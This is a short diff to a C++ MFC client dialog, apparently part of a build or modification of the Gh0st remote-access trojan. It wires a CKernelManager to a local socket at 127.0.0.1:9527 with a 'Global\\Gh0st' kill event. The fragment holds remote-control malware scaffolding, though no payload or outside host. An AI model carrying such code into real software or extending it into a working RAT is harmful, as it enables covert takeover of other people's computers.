@@ -106,8 +106,16 @@ BOOL CPrincClientDlg::OnInitDialog()
 		AfxMessageBox(_T("连接failed"));
 	if(!sendLoginInfo(_T("aaa"),&m_clientSocket,GetTickCount()-dTime ))
 		AfxMessageBox(_T("send failed"));
-	CKernelManager	manager(&m_clientSocket, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
-	socketClient.setManagerCallBack(&manager);
+	wchar_t	strKillEvent[50];
+	wsprintf(strKillEvent, _T("Global\\Gh0st %d"), GetTickCount()); // 随机事件名
+	HANDLE	hEvent = NULL;
+	hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
+	if (hEvent != NULL)
+	{
+		CloseHandle(hEvent);
+	}
+	CKernelManager	manager(&m_clientSocket, _T("aaa"), 0, strKillEvent, _T("127.0.0.1"), 9527);
+	m_clientSocket.setManagerCallBack(&manager);
 
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
 }
